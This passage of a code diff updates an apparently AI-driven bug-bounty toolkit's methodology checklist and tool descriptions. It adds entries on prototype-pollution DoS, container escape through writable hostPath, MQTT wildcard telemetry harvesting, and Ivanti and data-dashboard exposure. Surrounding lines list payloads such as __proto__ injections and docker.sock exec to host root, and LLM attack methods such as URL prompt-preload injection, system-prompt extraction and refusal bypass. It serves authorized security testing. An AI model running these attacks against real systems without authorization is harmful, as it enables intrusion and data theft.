never brute-force a live login with these lists; pair with leak-monitoring for cred pairs", "Reporting: a cracked hash only matters with the plaintext to impact (credential stuffing, admin login, archive contents) \u2014 document hashcat mode + wordlist + time-to-crack"],
+		techniques: ["fcrackzip", "hashcat mode matrix", "weak-hash 2FA challenge", "testssl.sh cipher audit", "SWEET32/POODLE/CRIME legacy checks", "decodable token flip"],
 	},
 	{
 		slug: "captcha-bypass",
@@ -1597,9 +1654,10 @@ const CHECKLIST = [
 			"Detection matrix: JSON.parse + deep-merge (lodash merge/defaultsDeep, jQuery.extend), Object.assign chains, express.json + qs; Node <20 Object.prototype holes (CVE-2022-29078 etc.)",
 			"Server-side detection: {\"__proto__\":{\"status\":444}} then fetch /admin — 444 = polluted; {\"__proto__\":{\"json spaces\":10}} + exposedHeaders pollution",
 			"Pug outputFunctionName RCE gadget; child_process shell:true + env NODE_OPTIONS --require /proc/self/environ",
-			"DOM Invader gadget finder; constructor[prototype][x] and fragment #__proto__[x] variants"
+			"DOM Invader gadget finder; constructor[prototype][x] and fragment #__proto__[x] variants",
+		"toString/valueOf type-confusion as guaranteed-DoS primitive: pollute Object.prototype.toString/valueOf so hashing, sorting, and string-coercion paths throw or loop (NaN keys, duplicate sort keys) \u2014 a low-effort guaranteed crash on JSON.parse + deep-merge stacks; also pollute lookup keys (constructor/prototype names used in switch/lookup tables) for auth bypass",
 		],
-		techniques: ["constructor.prototype isAdmin", "__proto__[x]=y qs", "NODE_OPTIONS RCE", "EJS process.mainModule", "DOM innerHTML pollution", "deep-merge gadgets"]
+		techniques: ["constructor.prototype isAdmin", "__proto__[x]=y qs", "NODE_OPTIONS RCE", "EJS process.mainModule", "DOM innerHTML pollution", "deep-merge gadgets", "toString/valueOf DoS primitive"]
 	},
 	{
 		slug: "cache-poisoning",
@@ -1631,9 +1689,10 @@ const CHECKLIST = [
 			"Categorized red-team corpus: prompt-injection, jailbreak, system-prompt-leak, data-exfil, indirect-injection, guardrail-bypass; pair with canary-token detection",
 			"Denial-of-wallet / token-cost exhaustion via long-input flooding; multimodal injection gap",
 			"LLM output -> dangerous sink testing (XSS/SSRF/SQLi when model output reaches browser/backend); multi-turn crescendo jailbreaks",
-			"Prompt-preload via URL query param (?prompt=, rovoChatPrompt style): one-click injection — the attacker's link pre-fills the chat context with instructions, no typed chat message required; test every deep-link that seeds chat state"
+			"Prompt-preload via URL query param (?prompt=, rovoChatPrompt style): one-click injection — the attacker's link pre-fills the chat context with instructions, no typed chat message required; test every deep-link that seeds chat state",
+		"AI bias/fairness & guardrail red-team class: test ranking/credit/content decisions for group bias (parity tests across inputs), harmful-content guardrails (refusal bypass by reformulation), and training-data PII recall (probe for memorized emails/numbers) \u2014 frame as policy/regulatory impact, distinct from prompt injection",
 		],
-		techniques: ["system-prompt extraction", "indirect prompt injection", "RAG poisoning", "chatbot IDOR chain", "tool-call abuse", "conversation leak", "URL prompt-preload"]
+		techniques: ["system-prompt extraction", "indirect prompt injection", "RAG poisoning", "chatbot IDOR chain", "tool-call abuse", "conversation leak", "URL prompt-preload", "bias/fairness parity tests"]
 	},
 	{
 		slug: "mobile-app",
@@ -1667,9 +1726,10 @@ const CHECKLIST = [
 			"GCP storage XML listing; Firestore REST firestore.googleapis.com/v1/projects/<p>/databases/(default)/documents/<col>",
 			"Azure AD user enumeration IfExistsResult 0=exists 1=not-exists; Azure Function App URLs unauth",
 			"Dangling DNS provider registrars: *.s3.amazonaws.com, *.herokuapp.com, *.ghost.io, *.azurewebsites.net",
-			"Shared-storage ACL battery (Drive/SharePoint/OneDrive/Box sync-shared folders): test each ACL mode an org commonly mis-sets — 'anyone with the link can EDIT' (delete/replace shared files, upload same-named malware into the trusted share), 'anyone can COMMENT' (phish bait living inside org-shared docs), external-share expiry disabled, and per-folder ACL inheritance breaks that expose archived/legal files; delete/replace capability must be proven, not just read"
+			"Shared-storage ACL battery (Drive/SharePoint/OneDrive/Box sync-shared folders): test each ACL mode an org commonly mis-sets — 'anyone with the link can EDIT' (delete/replace shared files, upload same-named malware into the trusted share), 'anyone can COMMENT' (phish bait living inside org-shared docs), external-share expiry disabled, and per-folder ACL inheritance breaks that expose archived/legal files; delete/replace capability must be proven, not just read",
+		"AWS IoT Core/MQTT broker analysis: unauth identity-pool creds -> IoT policy; wildcard subscribe (#, +) on device topics = full device telemetry harvest; topic-space enumeration for control topics",
 		],
-		techniques: ["registry image pull", "GCS/Azure-blob anon", "48-pattern secret catalog", "sts get-caller-identity", "Cognito unauth role", "IMDS matrix", "shared-drive anyone-with-link ACL"]
+		techniques: ["registry image pull", "GCS/Azure-blob anon", "48-pattern secret catalog", "sts get-caller-identity", "Cognito unauth role", "IMDS matrix", "shared-drive anyone-with-link ACL", "IoT Core MQTT wildcard"]
 	},
 	{
 		slug: "k8s-docker",
@@ -1681,9 +1741,10 @@ const CHECKLIST = [
 			"etcd 2379: unauthenticated etcd dump = every secret in the cluster; test GET http://host:2379/version then /v3/kv",
 			"docker socket exposure: /var/run/docker.sock via SSRF or a mounted container — docker -H unix:///var/run/docker.sock ps -> exec -> host root; Docker API on 2375/TCP binds",
 			"ServiceAccount tokens: a token found in a leaked pod/app (K8s_in_Certificates/TrustedCA) — check its RBAC permissions with kubectl auth can-i --list; do not run kubectl --all-namespaces blindly",
-			"Registry scraping: internal registry (Harbor/Nexus/ECR) reachable — anonymous pull of app images then layer-dive (see cloud-misconfig registry chain)"
+			"Registry scraping: internal registry (Harbor/Nexus/ECR) reachable — anonymous pull of app images then layer-dive (see cloud-misconfig registry chain)",
+		"Writable hostPath -> container escape: hostPath volumes mounted writable let a pod write the host filesystem (authorized_keys, cron) \u2014 check pod specs for rw hostPath; Kata/gVisor hostPath RCE CVE-2020-28914 (dir+files share writes outside the sandbox)",
 		],
-		techniques: ["kubelet 10250 /pods", "API 6443 anonymous", "etcd 2379 dump", "docker.sock exec", "ServiceAccount RBAC check", "internal registry pull"]
+		techniques: ["kubelet 10250 /pods", "API 6443 anonymous", "etcd 2379 dump", "docker.sock exec", "ServiceAccount RBAC check", "internal registry pull", "hostPath writable escape", "CVE-2020-28914 Kata/gVisor"]
 	},
 	{
 		slug: "enterprise-platforms",
@@ -1698,9 +1759,11 @@ const CHECKLIST = [
 			"Doctrine: management-plane CVEs are pre-auth, network-reachable, mass-exploited within days — Critical same-day callout; capture baseline, and if the appliance PATCHES mid-test, capture the patched state as a SECOND finding (see engagement)",
 			"Atlassian Jira anonymous-access surface: /secure/QueryComponent!Default.jspa (CVE-2020-14179) + Filter REST with x-ausername: anonymous header, numeric-ID org/group enumeration via public issue fields — anonymous-only endpoints that leak user/org metadata",
 			"Self-hosted GitLab unauth battery: /users filter-param bypass when the base API 403s (e.g. /users?search=...), /users/:id/keys (public SSH keys), snippets, project registries, /-/metadata, /api/v4/projects?simple=true&membership=false — derive infra/PII from public keys and metadata",
-			"Keycloak realm default-credential battery: default admin/admin, /auth/realms/master/.well-known/openid-configuration realm enumeration, user-registration-open realms with default roles"
+			"Keycloak realm default-credential battery: default admin/admin, /auth/realms/master/.well-known/openid-configuration realm enumeration, user-registration-open realms with default roles",
+		"Ivanti EPM Mobile family (CVE-2025-4428 class): fingerprint /mobile/ and EPM Mobile endpoints, check the unauthenticated SQLi/pre-auth surface and default admin portal paths",
+		"Data-infra dashboard exposure: Flink/Spark/Kafka/Airflow control-plane UIs exposed (8081/8080/9090) \u2014 unauthenticated job submission, dashboard DoS, and broker/monitoring surface; MQTT brokers with wildcard-subscribe capability",
 		],
-		techniques: ["bb_vpn_fingerprint", "bb_entra_tenant_probe", "vCenter CVE matrix", "VPN cookie fingerprints", "AADSTS password-valid codes", "SharePoint ToolShell", "Jira anonymous REST", "GitLab unauth filter bypass", "Keycloak realm defaults"]
+		techniques: ["bb_vpn_fingerprint", "bb_entra_tenant_probe", "vCenter CVE matrix", "VPN cookie fingerprints", "AADSTS password-valid codes", "SharePoint ToolShell", "Jira anonymous REST", "GitLab unauth filter bypass", "Keycloak realm defaults", "Ivanti EPM Mobile 4428", "Flink/Spark/Kafka/Airflow dashboards", "MQTT wildcard subscribe"]
 	},
 	{
 		slug: "cicd-supply-chain",
@@ -1712,9 +1775,10 @@ const CHECKLIST = [
 			"Jenkins: script console unauth/weak-creds, CVE-2024-23897 (args file read -> secret leak); Groovy sandbox escape classics",
 			"Typosquat/dependency-confusion: curl -sk $TARGET/main.js | grep -oE '@[a-z-]+/[a-z-]+' | sort -u — scoped packages NOT public on npm are confusion candidates; same for PyPI near-names (BOUNDARY: actual publishing/typosquat attacks are EXTERNAL-OFFENSIVE — require written sign-off)",
 			"Registry search: Docker Hub /v2/search/repositories/?query=<brand>, npm search <brand>, PyPI — shadow orgs and lefthook-style takeover candidates; package metadata (author/email) pivots to GitHub handles",
-			"Leaked pipeline configs: /.github/workflows, /Jenkinsfile, gitlab-ci.yml, .circleci/config.yml from repos — secret usage patterns, registry creds, deploy targets"
+			"Leaked pipeline configs: /.github/workflows, /Jenkinsfile, gitlab-ci.yml, .circleci/config.yml from repos — secret usage patterns, registry creds, deploy targets",
+		"Third-party library audit battery: locally install-and-PoC the org's small npm/PyPI deps (static-server packages, media parsers, path mappers) \u2014 wrapper abuse (exec->spawn remediation), crafted-value RCE, and registry-package vuln hunting; a vuln in a 200-download module is still a finding if the org bundles it",
 		],
-		techniques: ["pull_request_target injection", "self-hosted runner RCE", "Jenkins 23897", "npm/PyPI confusion", "registry search", "pipeline secret hunt"]
+		techniques: ["pull_request_target injection", "self-hosted runner RCE", "Jenkins 23897", "npm/PyPI confusion", "registry search", "pipeline secret hunt", "npm/PyPI local audit battery"]
 	},
 	{
 		slug: "web3-audit",
@@ -2511,7 +2575,7 @@ const TOOLS = [
 	},
 	{
 		name: "bb_checklist",
-		description: "Bug bounty methodology checklist (81 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
+		description: "Bug bounty methodology checklist (85 categories: recon, IDOR/BAC, SSRF, auth, XSS, css-injection, SQLi, second-order-injection, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, dos-resource-exhaustion, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, hash-archive-cracking, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
 		parameters: {
 			type: "object",
 			additionalProperties: false,
@@ -6115,7 +6179,7 @@ const GUIDANCE = [
 	"- bb_tech_detect(url) — fingerprint the tech stack from headers, cookies and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, React, jQuery, nginx, IIS, Cloudflare, ...).",
 	"- bb_wayback_urls(domain, limit?) — archived URLs from the Wayback CDX API; flags interesting endpoints/params (id, file, redirect, token, auth, download, cmd, admin, api, .env, .git, swagger, graphql).",
 	"- bb_recon(domain) — one-shot pipeline: enum -> probe -> tech detect -> header audit; returns live hosts + findings (missing headers, leaks, cookie flags, http-only hosts).",
-	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (81 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
+	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (85 categories: recon, IDOR/BAC, SSRF, auth, XSS, css-injection, SQLi, second-order-injection, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, dos-resource-exhaustion, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, hash-archive-cracking, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
 	"- bb_actuator_scan(url) — probe Spring Boot Actuator endpoints (/actuator/env, /heapdump, /jolokia, ...) for exposed internals, high-risk hits and default config.",
 	"- bb_js_secrets(domain, limit?) — mine archived JS bundles from the Wayback CDX API for leaked secrets (AWS keys, Google API keys, JWTs, generic key/secret pairs).",
 	"- bb_403_bypass(url) — try HTTP method flips, routing headers (X-Original-URL, X-Forwarded-For, X-Real-IP) and path mutations (/./, /%2e/, ;, %00, ..;/ etc) against a 403.",
